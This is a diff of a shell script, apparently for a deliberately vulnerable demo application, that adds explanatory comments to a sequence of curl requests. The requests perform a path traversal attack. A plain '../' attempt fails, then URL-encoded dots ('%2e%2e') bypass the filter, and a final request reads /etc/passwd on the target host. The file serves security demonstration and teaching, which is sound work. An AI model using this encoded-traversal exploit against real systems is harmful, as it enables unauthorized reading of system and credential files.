@@ -8,11 +8,11 @@ curl "$GOOF_HOST/public/about.html"
 # Directory listing (not necessary)
 curl "$GOOF_HOST/public/"
 
-# Failed ../
+# Failed ../, recognized by the server
 curl "$GOOF_HOST/public/../../../"
 
-# Exploit start
+# Exploit start by using encoded dots
 curl "$GOOF_HOST/public/%2e%2e/%2e%2e/%2e%2e/"
 
-# Exploit full
+# Exploit full, access passwd file
 curl "$GOOF_HOST/public/%2e%2e/%2e%2e/%2E%2E/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
